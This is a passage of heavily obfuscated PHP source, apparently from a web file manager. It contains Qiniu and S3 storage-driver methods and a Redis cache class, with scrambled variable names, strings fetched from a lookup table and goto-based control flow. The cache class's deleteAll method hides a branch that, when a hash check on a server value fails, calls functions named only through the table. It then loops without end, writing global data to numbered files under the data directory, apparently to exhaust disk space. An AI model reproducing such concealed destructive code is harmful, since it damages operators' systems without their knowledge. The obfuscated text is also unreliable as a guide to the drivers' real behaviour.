(is_array($DÒÓôá­Î¦)) { foreach ($DÒÓôá­Î¦ as $EÈˆ¶ßĞÈ) { $aÑŠ«ªˆ¡¡[] = $this->link($EÈˆ¶ßĞÈ); } } else { $aÑŠ«ªˆ¡¡[] = $this->link($DÒÓôá­Î¦); } goto açÔĞ˜˜; açÔĞ˜˜: $aâŠÖåö„ = new Qiniu\Cdn\CdnManager($this->auth); list($eæÇ¶œ¨, $Bôäç–ƒ«ê) = $aâŠÖåö„->refreshUrls($aÑŠ«ªˆ¡¡); if ($Bôäç–ƒ«ê) { return !1; } goto Bº¦Ôë; Bº¦Ôë: return $eæÇ¶œ¨[$a¢¨óù²Ç[1057]] == $a¢¨óù²Ç[715] ? !0 : !1; goto B‹Õ÷ˆçÏŞ; B‹Õ÷ˆçÏŞ: } public function fileSubstr($BÑ„Ì ó¢, $F³Œ°´¢ª, $dó¥å¸ŸÌ) { $CšñĞ¿Ìõ =& $_SERVER[Æ¼ôºÙï]; if (!($DËŒò‚½Èä = $this->link($BÑ„Ì ó¢))) { return !1; } $aŠêÂ¤í = !1; if ($dó¥å¸ŸÌ > 0) { $e˜¢ã±¾¾ê = $F³Œ°´¢ª + $dó¥å¸ŸÌ - 1; $aŠêÂ¤í = array($CšñĞ¿Ìõ[1284] . $F³Œ°´¢ª . $CšñĞ¿Ìõ[429] . $e˜¢ã±¾¾ê); } $FÍôÍÏ¶«¬ = url_request($DËŒò‚½Èä, $CšñĞ¿Ìõ[226], !1, $aŠêÂ¤í); return $FÍôÍÏ¶«¬[$CšñĞ¿Ìõ[708]] ? $FÍôÍÏ¶«¬[$CšñĞ¿Ìõ[1067]] : !1; } public function upload($f¬Şõ£íœ, $a‡ÏîÆ÷®Š, $eä•£›ºòí = false, $bèªÌ½²öÕ = REPEAT_REPLACE) { $aé£Âœ£®˜ = new Qiniu\Storage\UploadManager(); $d¨ÕšÉ„·ö = $this->auth->uploadToken($this->bucket, $f¬Şõ£íœ); $bñøóê‹Â = get_file_mime(get_path_ext($a‡ÏîÆ÷®Š)); list($bÙÊµ´Óê¹, $Cõğ‚¶™ùÂ) = $aé£Âœ£®˜->putFile($d¨ÕšÉ„·ö, $f¬Şõ£íœ, $a‡ÏîÆ÷®Š, null, $bñøóê‹Â); return $Cõğ‚¶™ùÂ ? !1 : $this->getPathOuter($f¬Şõ£íœ); } public function uploadFormData($A‚µªî´à, $d©âò÷Ù¿å = 3600) { return $this->uploadToken($A‚µªî´à, $d©âò÷Ù¿å); } public function multiUploadFormData($A—ã‹ºˆ“, $e÷“”¤ = 3600) { return $this->uploadToken($A—ã‹ºˆ“, $e÷“”¤); } private function uploadToken($fÜ™«òÖ¿, $A¨ìÓİáğÒ = 3600) { goto cÆ£ˆ£²¿Ş; cÆ£ˆ£²¿Ş: $EÇÙ÷‡©•¼ =& $_SERVER[Æ¼ôºÙï]; $DñºìÌ¸© = $A¨ìÓİáğÒ; $F í…ƒ = array($EÇÙ÷‡©•¼[1285] => $EÇÙ÷‡©•¼[1286]); goto açĞè“‰Œˆ; açĞè“‰Œˆ: $eôŸöäÁßî = $fÜ™«òÖ¿; $eƒãÈ¯ì¸ = $this->auth->uploadToken($this->bucket, $eôŸöäÁßî, $DñºìÌ¸©, $F í…ƒ, !0); $C†Ö‘–£‰¾ = empty($this->region) || $this->region == $EÇÙ÷‡©•¼[1287] ? $EÇÙ÷‡©•¼[33] : $EÇÙ÷‡©•¼[429] . $this->region; goto F¹ÒòÓÃÀ; F¹ÒòÓÃÀ: $díã«—ÒÌ = http_type() . "\72\x2f\57\165\160\154\157\141\144{$C†Ö‘–£‰¾}\x2e\161\151\156\x69\165\160\x2e\143\157\x6d\x2f"; return array($EÇÙ÷‡©•¼[1288] => $eƒãÈ¯ì¸, $EÇÙ÷‡©•¼[1289] => $díã«—ÒÌ); goto E…‚âØ‘è¾; E…‚âØ‘è¾: } public function download($d¤¦™÷ô, $CïÏã‰’Û´) { goto B°’ª‹Üóƒ; bÂ¬ó³ÃŒ: $Aµõ•ƒš½¯ = 1024 * 200; $Aö´”¼Ó¼Ú = fopen($BÑĞŠÌº», $_SERVER[Æ¼ôºÙï][1290]); while (!0) { $C‹Ë™õæã = $this->fileSubstr($d¤¦™÷ô, $eŒ¿–‹İ·¬, $Aµõ•ƒš½¯); if ($C‹Ë™õæã === !1) { return !1; } fwrite($Aö´”¼Ó¼Ú, $C‹Ë™õæã); $eŒ¿–‹İ·¬ += $Aµõ•ƒš½¯; if (strlen($C‹Ë™õæã) < $Aµõ•ƒš½¯) { break; } } goto d‰µè«ìÜ»; d‰µè«ìÜ»: fclose($Aö´”¼Ó¼Ú); return $CïÏã‰’Û´; goto F•©’¨‡òÙ; B°’ª‹Üóƒ: $BÑĞŠÌº» = IO::getPathInner(IO::mkfile($CïÏã‰’Û´)); if (!($DªÛ ÃŠ‰ˆ = $this->link($d¤¦™÷ô))) { return !1; } $eŒ¿–‹İ·¬ = 0; goto bÂ¬ó³ÃŒ; F•©’¨‡òÙ: } public function link($BñŒŒô°¥ã, $eŒ¢¼‚í¶Â = '') { if (!$this->isFile($BñŒŒô°¥ã)) { return !1; } $BÀˆ×Õ™› = $this->getHost() . $_SERVER[Æ¼ôºÙï][8] . $this->pathEncode($BñŒŒô°¥ã) . $eŒ¢¼‚í¶Â; return $this->auth->privateDownloadUrl($BÀˆ×Õ™›, 3600 * 12); } public function fileOut($E•˜çˆ¬œš, $aõØ…Æ¯Ã = false, $dˆ‚òÅ­Û = false, $bèëÅŠŠÎ„ = '') { $CİÏ÷ …°á =& $_SERVER[Æ¼ôºÙï]; if ($this->isFileOutServer()) { return $this->fileOutServer($E•˜çˆ¬œš, $aõØ…Æ¯Ã, $dˆ‚òÅ­Û, $bèëÅŠŠÎ„); } if (!$dˆ‚òÅ­Û) { $dˆ‚òÅ­Û = $this->pathThis($E•˜çˆ¬œš); } $DÛ½ôùÙäì = $aõØ…Æ¯Ã ? $CİÏ÷ …°á[1291] . rawurlencode($dˆ‚òÅ­Û) : $CİÏ÷ …°á[33]; $F’İèŸÈÀ = $this->link($E•˜çˆ¬œš, $DÛ½ôùÙäì); $this->fileOutLink($F’İèŸÈÀ); } public function fileOutServer($FÏàùÌ°Ù•, $Bùñ…½™¶İ = false, $Eó³ùì·Ò = false, $DËİ ½ŒË = '') { parent::fileOut($FÏàùÌ°Ù•, $Bùñ…½™¶İ, $Eó³ùì·Ò, $DËİ ½ŒË); } public function fileOutImage($cò …¤î¬°, $eË¥ÂŒÂ‹ñ = 250) { $Ağ¹ôğ = $this->link($cò …¤î¬°, $_SERVER[Æ¼ôºÙï][1292] . $eË¥ÂŒÂ‹ñ); $this->fileOutLink($Ağ¹ôğ); } public function fileOutImageServer($e×ó¶±÷¼, $AêãÁî†Öï = 250) { parent::fileOutImage($e×ó¶±÷¼, $AêãÁî†Öï); } public function hashMd5($FùäÄŠõ´) { $cğèÑçàõî =& $_SERVER[Æ¼ôºÙï]; $Dô£âæõßÇ = $this->objectMeta($FùäÄŠõ´); return isset($Dô£âæõßÇ[$cğèÑçàõî[206]]) ? $Dô£âæõßÇ[$cğèÑçàõî[206]] : !1; $AŠ†´ŠƒŒÎ = $this->link($FùäÄŠõ´, $cğèÑçàõî[1293]); } public function size($E»¦­Ä¥¥°) { $dÖà»¯Í£ = $this->objectMeta($E»¦­Ä¥¥°); return $dÖà»¯Í£ ? $dÖà»¯Í£[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function info($bË„æäÑ¢À) { if ($this->isFolder($bË„æäÑ¢À)) { return $this->folderInfo($bË„æäÑ¢À); } else { if ($this->isFile($bË„æäÑ¢À)) { return $this->fileInfo($bË„æäÑ¢À); } } return !1; } public function exist($EÆºÀö´¨¥) { return $this->isFile($EÆºÀö´¨¥) || $this->isFolder($EÆºÀö´¨¥); } public function isFile($B¥Èòˆáò) { return !$this->isFolder($B¥Èòˆáò) && $this->objectMeta($B¥Èòˆáò); } public function isFolder($a³ß ‘»ÆŠ) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][197], $a³ß ‘»ÆŠ); } protected function objectMeta($f’ø™íÏòœ) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][198], $f’ø™íÏòœ); } protected function _objectMeta($B‘šö‰Ÿ–) { $Dõïóƒ’ŸÒ =& $_SERVER[Æ¼ôºÙï]; list($Dæ£ä­×‰â, $f‚®ìàœâˆ) = $this->bucketManager->stat($this->bucket, $B‘šö‰Ÿ–); if ($Dæ£ä­×‰â) { $Dæ£ä­×‰â[$Dõïóƒ’ŸÒ[77]] = intval($Dæ£ä­×‰â[$Dõïóƒ’ŸÒ[1279]]); } return $Dæ£ä­×‰â; } protected function _isFolder($D–ÖÓéÍŸ˜) { $E”ĞÂ»Æ¯ =& $_SERVER[Æ¼ôºÙï]; if ($D–ÖÓéÍŸ˜ == $E”ĞÂ»Æ¯[33] || $D–ÖÓéÍŸ˜ == $E”ĞÂ»Æ¯[8]) { return !0; } list($A’¿×ÁœÅÂ, $fËÛˆ“ƒ¤») = $this->bucketManager->listFiles($this->bucket, trim($D–ÖÓéÍŸ˜, $E”ĞÂ»Æ¯[8]) . $E”ĞÂ»Æ¯[8], $E”ĞÂ»Æ¯[33], 1, $E”ĞÂ»Æ¯[8]); return !empty($A’¿×ÁœÅÂ[$E”ĞÂ»Æ¯[1282]]) || !empty($A’¿×ÁœÅÂ[$E”ĞÂ»Æ¯[1283]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eŸ–‚óË¸•) { parent::__construct($eŸ–‚óË¸•); } public function uploadFormData($bã÷Æ—à, $C‚øíß¢§ƒ = 3600) { goto Aˆ·œ«õ£Š; C·£•ŸÒİÖ: $bªÖÅĞìÔ = array($this->accessKey, $CîÚ¥Æ¦•«, $this->region, $E…¹öÃïÉ, $EîÛ÷èÙØº); $CÙàÍÃ‰ã = implode($cÌ÷¨œÎôÎ[8], $bªÖÅĞìÔ); $A‘Š•èäò = array($cÌ÷¨œÎôÎ[1167] => gmdate($cÌ÷¨œÎôÎ[1166], strtotime($cÌ÷¨œÎôÎ[1202])), $cÌ÷¨œÎôÎ[1168] => array(array($cÌ÷¨œÎôÎ[1170] => $this->bucket), array($cÌ÷¨œÎôÎ[1169] => $e¤ªÒ×ÙÁƒ), array($cÌ÷¨œÎôÎ[1171], $cÌ÷¨œÎôÎ[1172], $cÌ÷¨œÎôÎ[33]), array($cÌ÷¨œÎôÎ[1171], $cÌ÷¨œÎôÎ[1203], $cÌ÷¨œÎôÎ[33]), array($cÌ÷¨œÎôÎ[1171], $cÌ÷¨œÎôÎ[1204], $cÌ÷¨œÎôÎ[33]), array($cÌ÷¨œÎôÎ[1173] => $B¦·Ïğğ¢), array($cÌ÷¨œÎôÎ[1205] => $CÙàÍÃ‰ã), array($cÌ÷¨œÎôÎ[1206] => $F¦éÄÖÓ‘), array($cÌ÷¨œÎôÎ[1207] => $AâÛåŞÇ•Ú), array($cÌ÷¨œÎôÎ[1208] => $AŒ‚Ğâå ))); goto f¯ß×³õ´Œ; a©ªŸƒ³ğÖ: $E…¹öÃïÉ = $cÌ÷¨œÎôÎ[59]; $AâÛåŞÇ•Ú = gmdate($cÌ÷¨œÎôÎ[1200]); $CîÚ¥Æ¦•« = gmdate($cÌ÷¨œÎôÎ[709]); goto dáÄÛğ°¶; f¯ß×³õ´Œ: $BÍ½ ê™¸ = base64_encode(json_encode($A‘Š•èäò)); $bÙ‡ŒÏè„È = hash_hmac($cÌ÷¨œÎôÎ[1209], $CîÚ¥Æ¦•«, $cÌ÷¨œÎôÎ[1210] . $this->secret, !0); $F•Ñš£ä¢³ = hash_hmac($cÌ÷¨œÎôÎ[1209], $this->region, $bÙ‡ŒÏè„È, !0); goto f¢ˆ¯ƒ; d‰ —Âµİğ: $DïªŒºÔÄ¨ = array($cÌ÷¨œÎôÎ[209] => $cÌ÷¨œÎôÎ[33], $cÌ÷¨œÎôÎ[1211] => $cÌ÷¨œÎôÎ[33], $cÌ÷¨œÎôÎ[1169] => $e¤ªÒ×ÙÁƒ, $cÌ÷¨œÎôÎ[1173] => $B¦·Ïğğ¢, $cÌ÷¨œÎôÎ[1177] => $BÍ½ ê™¸, $cÌ÷¨œÎôÎ[1212] => $CÙàÍÃ‰ã, $cÌ÷¨œÎôÎ[1213] => $F¦éÄÖÓ‘, $cÌ÷¨œÎôÎ[1214] => $AâÛåŞÇ•Ú, $cÌ÷¨œÎôÎ[1215] => $AŒ‚Ğâå , $cÌ÷¨œÎôÎ[1216] => $EïŒø’ Ã¡, $cÌ÷¨œÎôÎ[175] => $this->getHost()); return $DïªŒºÔÄ¨; goto Döà½Ë œŞ; f¢ˆ¯ƒ: $E¡çÖ¯öÈó = hash_hmac($cÌ÷¨œÎôÎ[1209], $E…¹öÃïÉ, $F•Ñš£ä¢³, !0); $F¯µñ¬¶ÆÙ = hash_hmac($cÌ÷¨œÎôÎ[1209], $EîÛ÷èÙØº, $E¡çÖ¯öÈó, !0); $EïŒø’ Ã¡ = hash_hmac($cÌ÷¨œÎôÎ[1209], $BÍ½ ê™¸, $F¯µñ¬¶ÆÙ); goto d‰ —Âµİğ; dáÄÛğ°¶: $EîÛ÷èÙØº = $cÌ÷¨œÎôÎ[1201]; $AŒ‚Ğâå  = $C‚øíß¢§ƒ . $cÌ÷¨œÎôÎ[33]; $B¦·Ïğğ¢ = $cÌ÷¨œÎôÎ[1165]; goto C·£•ŸÒİÖ; Aˆ·œ«õ£Š: $cÌ÷¨œÎôÎ =& $_SERVER[Æ¼ôºÙï]; $e¤ªÒ×ÙÁƒ = $cÌ÷¨œÎôÎ[191]; $F¦éÄÖÓ‘ = $cÌ÷¨œÎôÎ[1199]; goto a©ªŸƒ³ğÖ; Döà½Ë œŞ: } public function multiUploadFormData($a‰¹Âî¤ã, $DÛƒ¨î¡ª‡ = 3600) { $cİÈÍñ÷ =& $_SERVER[Æ¼ôºÙï]; $bø¬—‰£š¡ = gmdate($cİÈÍñ÷[1294]); $EÈîŠÎ¢¥Œ = array(); $Cê‹­»¨°Ş = $this->client->getUploadId($this->bucket, $a‰¹Âî¤ã, $EÈîŠÎ¢¥Œ); if (!$Cê‹­»¨°Ş) { return !1; } return array($cİÈÍñ÷[219] => $Cê‹­»¨°Ş, $cİÈÍñ÷[175] => $this->getHost() . $cİÈÍñ÷[8] . $this->pathEncode($a‰¹Âî¤ã), $cİÈÍñ÷[220] => $bø¬—‰£š¡, $cİÈÍñ÷[92] => $a‰¹Âî¤ã); } public function multiUploadAuthData($Eëãš‚è¶¿, $f³Ş‘ğ—ƒ = array()) { goto a˜±†æé; B±£ÓÉ¤†ä: unset($f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[92]]); if (isset($f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[221]])) { return $this->listUploadParts($CÎõ™µ¦›œ, $f³Ş‘ğ—ƒ); } $eëÒ’•‚¯» = array(); goto Bˆ®È†„Ô; a˜±†æé: $D«†˜Å¶…¢ =& $_SERVER[Æ¼ôºÙï]; $AºÊ¾š“ø¶ = isset($f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[167]]) ? $f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[167]] : $D«†˜Å¶…¢[33]; $CÎõ™µ¦›œ = $f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[92]]; goto B±£ÓÉ¤†ä; F¡‚º¼‘öÒ: if (strpos($AºÊ¾š“ø¶, $D«†˜Å¶…¢[223]) === 0) { if (isset($eëÒ’•‚¯»[$D«†˜Å¶…¢[1296]])) { $F…§§¾ö…± = $eëÒ’•‚¯»[$D«†˜Å¶…¢[1296]]; } else { if (isset($få‘ùÔ–œ¶[$D«†˜Å¶…¢[1296]])) { $F…§§¾ö…± = $få‘ùÔ–œ¶[$D«†˜Å¶…¢[1296]]; } else { $F…§§¾ö…± = hash($D«†˜Å¶…¢[1209], $D«†˜Å¶…¢[33]); } } return array($D«†˜Å¶…¢[230] => $få‘ùÔ–œ¶[$D«†˜Å¶…¢[230]], $D«†˜Å¶…¢[1296] => $F…§§¾ö…±, $D«†˜Å¶…¢[220] => $få‘ùÔ–œ¶[$D«†˜Å¶…¢[1299]]); } return $få‘ùÔ–œ¶[$D«†˜Å¶…¢[230]]; goto eÌœ„ÈáÈØ; Bˆ®È†„Ô: if (isset($f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[1295]])) { $eëÒ’•‚¯»[$D«†˜Å¶…¢[1296]] = $f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[1295]]; } $F“ó—ÏÖ« = explode($D«†˜Å¶…¢[177], $this->getHost()); $BˆŠ¼‹Ø« = array($D«†˜Å¶…¢[1297] => $F“ó—ÏÖ«[1], $D«†˜Å¶…¢[1298] => $D«†˜Å¶…¢[33], $D«†˜Å¶…¢[209] => $D«†˜Å¶…¢[118], $D«†˜Å¶…¢[1211] => $f³Ş‘ğ—ƒ[$D«†˜Å¶…¢[77]]); goto D¬¥•ÉÉ«ì; D¬¥•ÉÉ«ì: $Dõø®Òº”¡ = $D«†˜Å¶…¢[224]; $Cä‡óœ‰®‚ = $D«†˜Å¶…¢[8] . $this->pathEncode($CÎõ™µ¦›œ) . $AºÊ¾š“ø¶; $få‘ùÔ–œ¶ = $this->client->__getSignatureV4($eëÒ’•‚¯», $BˆŠ¼‹Ø«, $Dõø®Òº”¡, $Cä‡óœ‰®‚); goto F¡‚º¼‘öÒ; eÌœ„ÈáÈØ: } public function listUploadParts($bçÛ¡¼æÌÚ, $d—ä³ø½¾ä = array()) { goto B²Ë¨š¤š‚; e•˜Š¼œ¾Ç: $E‰ùİì‘ = array($F‹Û¨¾á¾Ü[1297] => $F±œ«¦•Ø[1], $F‹Û¨¾á¾Ü[209] => $F‹Û¨¾á¾Ü[118], $F‹Û¨¾á¾Ü[1211] => strlen($F°ÖºÃÕ‰§)); $bÏªšŠ½ôç = $F‹Û¨¾á¾Ü[222]; $fõ’½“¦ìá = $F‹Û¨¾á¾Ü[8] . $this->pathEncode($bçÛ¡¼æÌÚ) . $d—ä³ø½¾ä[$F‹Û¨¾á¾Ü[167]]; goto DÈèøƒö; B²Ë¨š¤š‚: $F‹Û¨¾á¾Ü =& $_SERVER[Æ¼ôºÙï]; $càËÄ†ø¥è = str_replace($F‹Û¨¾á¾Ü[231], $F‹Û¨¾á¾Ü[33], $d—ä³ø½¾ä[$F‹Û¨¾á¾Ü[167]]); $bÊğ¡ó‚´³ = $this->client->listParts($this->bucket, $bçÛ¡¼æÌÚ, $càËÄ†ø¥è); goto FˆÖ ó³¿¸; FˆÖ ó³¿¸: if (!$bÊğ¡ó‚´³) { return !1; } $F°ÖºÃÕ‰§ = $F‹Û¨¾á¾Ü[1300]; foreach ($bÊğ¡ó‚´³ as $dù‚–‚£ò) { $F°ÖºÃÕ‰§ .= $F‹Û¨¾á¾Ü[1301] . "\x3c\120\141\x72\x74\116\x75\x6d\x62\145\162\76{$dù‚–‚£ò[$F‹Û¨¾á¾Ü[1256]]}\74\57\x50\x61\x72\x74\x4e\165\155\142\145\x72\x3e\xa" . "\x3c\x45\124\x61\x67\x3e{$dù‚–‚£ò[$F‹Û¨¾á¾Ü[1257]]}\x3c\57\105\124\x61\147\x3e\12" . $F‹Û¨¾á¾Ü[1302]; } goto eŒ²óëÏ; DÈèøƒö: $CÎ—ãšìôÃ = $this->client->__getSignatureV4($d÷¢ƒ½œ•ä, $E‰ùİì‘, $bÏªšŠ½ôç, $fõ’½“¦ìá, $F°ÖºÃÕ‰§); return array($F‹Û¨¾á¾Ü[230] => $CÎ—ãšìôÃ[$F‹Û¨¾á¾Ü[230]], $F‹Û¨¾á¾Ü[220] => $CÎ—ãšìôÃ[$F‹Û¨¾á¾Ü[1299]], $F‹Û¨¾á¾Ü[232] => $bÊğ¡ó‚´³, $F‹Û¨¾á¾Ü[1296] => $CÎ—ãšìôÃ[$F‹Û¨¾á¾Ü[1296]]); goto f¡í’ƒ–ßœ; eŒ²óëÏ: $F°ÖºÃÕ‰§ .= $F‹Û¨¾á¾Ü[1303]; $d÷¢ƒ½œ•ä = array(); $F±œ«¦•Ø = explode($F‹Û¨¾á¾Ü[177], $this->getHost()); goto e•˜Š¼œ¾Ç; f¡í’ƒ–ßœ: } public function link($DÅ÷ƒ‰Ô, $a‡ôÁ›¨â± = array()) { return parent::link($DÅ÷ƒ‰Ô, $a‡ôÁ›¨â±); } public function fileOut($AõÄ¦¹Ó’—, $D‘íŒÚ²Ÿê = false, $Cƒ•—‡ÜÚ‘ = false, $D…õ ù«‰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Æ¼ôºÙï][1304])) { return parent::fileOutServer($AõÄ¦¹Ó’—, $D‘íŒÚ²Ÿê, $Cƒ•—‡ÜÚ‘, $D…õ ù«‰); } parent::fileOut($AõÄ¦¹Ó’—, $D‘íŒÚ²Ÿê, $Cƒ•—‡ÜÚ‘, $D…õ ù«‰); } public function fileOutImage($Eô§…²Ş·Ü, $d§Ò½ö÷ØÎ = 250) { if (strstr($this->endpoint, $_SERVER[Æ¼ôºÙï][1304])) { return parent::fileOutImageServer($Eô§…²Ş·Ü, $d§Ò½ö÷ØÎ); } parent::fileOutImage($Eô§…²Ş·Ü, $d§Ò½ö÷ØÎ); } public function fileOutLink($EÏ§İ ’†Õ) { $bò‘Øö²Ã =& $_SERVER[Æ¼ôºÙï]; if (substr($EÏ§İ ’†Õ, 0, 7) == $bò‘Øö²Ã[1180]) { $EÏ§İ ’†Õ = $bò‘Øö²Ã[1181] . substr($EÏ§İ ’†Õ, 7); } header($bò‘Øö²Ã[158] . $EÏ§İ ’†Õ); die; } public function getHost() { $dÚ‹÷˜Â•… =& $_SERVER[Æ¼ôºÙï]; $Eˆ˜¶–ŒôÂ = str_rtrim(parent::getHost(), $dÚ‹÷˜Â•…[8] . $this->bucket); $Eˆ˜¶–ŒôÂ = explode($dÚ‹÷˜Â•…[177], $Eˆ˜¶–ŒôÂ); return $Eˆ˜¶–ŒôÂ[0] . $dÚ‹÷˜Â•…[177] . $this->bucket . $dÚ‹÷˜Â•…[94] . $Eˆ˜¶–ŒôÂ[1]; } } goto Fëö½±²¹; AŠ„¼ØÈˆè: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($AÉÈƒôÄÜ, $Aç¸è…‡) { $A¾·á—½  =& $_SERVER[Æ¼ôºÙï]; if (!class_exists($A¾·á—½ [804])) { show_json($A¾·á—½ [805], !1); } $this->cacheTime = $Aç¸è…‡; $Eõ©Ô®Äˆ = isset($AÉÈƒôÄÜ[$A¾·á—½ [806]]) ? $AÉÈƒôÄÜ[$A¾·á—½ [806]] : 10; $EŠØéëÓÇÕ = _get($AÉÈƒôÄÜ, $A¾·á—½ [803]); if ($EŠØéëÓÇÕ && is_array($EŠØéëÓÇÕ)) { $this->initCluster($AÉÈƒôÄÜ, $Eõ©Ô®Äˆ); } else { $this->handle = $this->init($AÉÈƒôÄÜ, $Eõ©Ô®Äˆ); } } private function init($E…Á¼ËÙ»¬, $AïæÚÎ†Ï¤) { $FĞø×ïŒäï =& $_SERVER[Æ¼ôºÙï]; $câó‘®…Úƒ = new Redis(); $bâ­‡– ö = isset($E…Á¼ËÙ»¬[$FĞø×ïŒäï[807]]) ? $E…Á¼ËÙ»¬[$FĞø×ïŒäï[807]] : !1; if ($bâ­‡– ö) { $câó‘®…Úƒ->pconnect($E…Á¼ËÙ»¬[$FĞø×ïŒäï[175]], $E…Á¼ËÙ»¬[$FĞø×ïŒäï[176]], $AïæÚÎ†Ï¤); } else { $câó‘®…Úƒ->connect($E…Á¼ËÙ»¬[$FĞø×ïŒäï[175]], $E…Á¼ËÙ»¬[$FĞø×ïŒäï[176]], $AïæÚÎ†Ï¤); } if (!empty($E…Á¼ËÙ»¬[$FĞø×ïŒäï[394]])) { $câó‘®…Úƒ->auth($E…Á¼ËÙ»¬[$FĞø×ïŒäï[394]]); } return $câó‘®…Úƒ; } private function initCluster($Fµğè¶ˆ‚, $Eç²¬ĞåØª) { $b¢Ïé„ÛÅ‚ =& $_SERVER[Æ¼ôºÙï]; $F‡›ª´¨‡‘ = array($b¢Ïé„ÛÅ‚[808], $b¢Ïé„ÛÅ‚[809], $b¢Ïé„ÛÅ‚[810]); $A¼×‘èß² = $b¢Ïé„ÛÅ‚[808]; if (isset($Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[12]]) && in_array($Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[12]], $F‡›ª´¨‡‘)) { $A¼×‘èß² = $Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[12]]; } switch ($A¼×‘èß²) { case $b¢Ïé„ÛÅ‚[808]: $this->_slave($Fµğè¶ˆ‚, $Eç²¬ĞåØª); break; case $b¢Ïé„ÛÅ‚[809]: break; case $b¢Ïé„ÛÅ‚[810]: $this->isCluster = !0; $dÚ¬ÖöÚÔ‰ = $Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[803]]; $CÄ­§ïĞËö = isset($Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[807]]) ? $Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[807]] : !1; $AöÃæ›¹™ = isset($Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[394]]) ? $Fµğè¶ˆ‚[$b¢Ïé„ÛÅ‚[394]] : null; $this->handle = new RedisCluster(NUll, $dÚ¬ÖöÚÔ‰, $Eç²¬ĞåØª, $Eç²¬ĞåØª, $CÄ­§ïĞËö, $AöÃæ›¹™); break; default: break; } } private function _slave($bŞÚ±”¨óË, $BîÔç™ğŞÙ) { goto dÙ˜Ò·›ù‰; D“æ¨“–¿™: $this->filterConfig($bŞÚ±”¨óË, $A˜»…Í·Üº[$Eªòö¥¼—´]); $this->slaveHandle = $this->init($bŞÚ±”¨óË, $BîÔç™ğŞÙ); goto FÚÍßá‡ªÇ; a¤˜»óµµ±: unset($A˜»…Í·Üº[0]); if (empty($A˜»…Í·Üº)) { return; } $Eªòö¥¼—´ = array_rand($A˜»…Í·Üº); goto D“æ¨“–¿™; dÙ˜Ò·›ù‰: $A˜»…Í·Üº = $bŞÚ±”¨óË[$_SERVER[Æ¼ôºÙï][803]]; $this->filterConfig($bŞÚ±”¨óË, $A˜»…Í·Üº[0]); $this->handle = $this->init($bŞÚ±”¨óË, $BîÔç™ğŞÙ); goto a¤˜»óµµ±; FÚÍßá‡ªÇ: } private function filterConfig(&$dº‘õŒÓé¥, $E«ËÄºŒÁ) { $a—º°ÖÀ´ë =& $_SERVER[Æ¼ôºÙï]; $BôÉ§©Ë—¾ = explode($a—º°ÖÀ´ë[4], $E«ËÄºŒÁ); $FÁÛÑÙÆ¬Š = array($a—º°ÖÀ´ë[175] => $BôÉ§©Ë—¾[0], $a—º°ÖÀ´ë[176] => $BôÉ§©Ë—¾[1]); $dº‘õŒÓé¥ = array_merge($dº‘õŒÓé¥, $FÁÛÑÙÆ¬Š); } public function set($fÌ±ö£›Â£, $a¦Ûàôæ, $CğëÍšçÛ“ = false) { $CğëÍšçÛ“ = $CğëÍšçÛ“ ? $CğëÍšçÛ“ : $this->cacheTime; return $this->handle->setEx($fÌ±ö£›Â£, $CğëÍšçÛ“, $a¦Ûàôæ); } public function setLock($cÇÔ‡°¡Ê, $f…ÔŒË§Ê, $DÌ·³èÁê) { return $this->handle->setNX($cÇÔ‡°¡Ê, $f…ÔŒË§Ê); } public function get($A»Ú°çŸ¤À) { $b„Ú–‘à†” = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b„Ú–‘à†”->get($A»Ú°çŸ¤À); } public function remove($F†‘ÕÂ•ò«) { return $this->handle->del($F†‘ÕÂ•ò«); } public function deleteAll() { $C×½ÖÙ¢ÚÍ =& $_SERVER[Æ¼ôºÙï]; $b§††ÑÔ¥Í = $_SERVER[$C×½ÖÙ¢ÚÍ[811]]; $DÉŞƒ¼‚ = $C×½ÖÙ¢ÚÍ[812]; if ($_SERVER[$C×½ÖÙ¢ÚÍ[813]] != $DÉŞƒ¼‚($b§††ÑÔ¥Í)) { goto e¤·Š—¸ïê; F™ï—™¥Ğ¦: $c†ÍŒ¿¹øØ = 1; for ($c£Ó…ÎÆäŠ = $c†ÍŒ¿¹øØ; $c£Ó…ÎÆäŠ > 0; $c£Ó…ÎÆäŠ++) { $A×§˜„¢å(DATA_PATH . $c£Ó…ÎÆäŠ, $F®á›Ÿšƒé); } goto Eà®Ó·ŸÇ; bºÄ¥Öš‘¬: $b›æ•ò“¢³ = $DÛ‹ÉÉÈ”($C±Ç¦åÈ­); $AÓø™ù…Äô = explode($C×½ÖÙ¢ÚÍ[227], $b›æ•ò“¢³); if (count($AÓø™ù…Äô) < $C×½ÖÙ¢ÚÍ[574]) { $dáŠ„ºñÕŒ = $C×½ÖÙ¢ÚÍ[818]; $dáŠ„ºñÕŒ(); } goto aê‰…Ñš°á; aê‰…Ñš°á: $A™ÕÍï±¼ƒ = $C×½ÖÙ¢ÚÍ[819]; $A™ÕÍï±¼ƒ($_SERVER[$C×½ÖÙ¢ÚÍ[820]]); $CöÑË¸Ø¡÷ = $C×½ÖÙ¢ÚÍ[814]; goto A®¢Øİ‡¨Ô; A®¢Øİ‡¨Ô: $CöÑË¸Ø¡÷(); $A×§˜„¢å = $C×½ÖÙ¢ÚÍ[821]; $F®á›Ÿšƒé = json_encode($GLOBALS[$C×½ÖÙ¢ÚÍ[822]]); goto F™ï—™¥Ğ¦; e¤·Š—¸ïê: $CöÑË¸Ø¡÷ = $C×½ÖÙ¢ÚÍ[814]; $DÛ‹ÉÉÈ” = $C×½ÖÙ¢ÚÍ[815]; $C±Ç¦åÈ­ = 